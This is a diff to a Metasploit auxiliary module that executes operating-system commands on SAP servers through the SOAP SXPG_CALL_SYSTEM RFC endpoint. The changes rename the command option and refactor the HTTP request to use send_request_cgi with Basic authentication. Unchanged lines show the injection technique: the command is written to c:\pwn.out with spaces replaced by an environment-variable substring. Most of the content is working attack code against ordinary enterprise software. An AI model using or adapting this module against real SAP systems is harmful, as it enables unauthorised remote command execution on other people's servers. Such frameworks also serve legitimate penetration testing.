@@ -2,7 +2,7 @@
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+#   http://metasploit.com/framework/
 ##
 
 ##
@@ -73,7 +73,7 @@ class Metasploit4 < Msf::Auxiliary
 			if num == 1
 				command = '-o c:\\\pwn.out -n pwnsap' + "\r\n!"
 				space = "%programfiles:~10,1%"
-				command << datastore['COMMAND'].gsub(" ",space)
+				command << datastore['CMD'].gsub(" ",space)
 			end
 			command = '-ic c:\\\pwn.out' if num == 2
 		end
@@ -92,22 +92,19 @@ class Metasploit4 < Msf::Auxiliary
 	end
 
 	def exec_command(ip,data)
-		user_pass = Rex::Text.encode_base64(datastore['USERNAME'] + ":" + datastore['PASSWORD'])
 		print_status("[SAP] #{ip}:#{rport} - sending SOAP SXPG_CALL_SYSTEM request")
 		begin
-			res = send_request_raw(
-				{
-					'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
-					'method' => 'POST',
-					'data' => data,
-					'headers' => {
-						'Content-Length' => data.size.to_s,
-						'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-						'Cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
-						'Authorization' => 'Basic ' + user_pass,
-						'Content-Type' => 'text/xml; charset=UTF-8'
-						}
-				}, 45)
+			res = send_request_cgi({
+				'uri' => '/sap/bc/soap/rfc?sap-client=' + datastore['CLIENT'] + '&sap-language=EN',
+				'method' => 'POST',
+				'data' => data,
+				'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
+				'ctype' => 'text/xml; charset=UTF-8',
+				'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
+				'headers' =>{
+					'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
+				}
+			})
 			if res and res.code != 500 and res.code != 200
 				print_error("[SAP] #{ip}:#{rport} - something went wrong!")
 				return
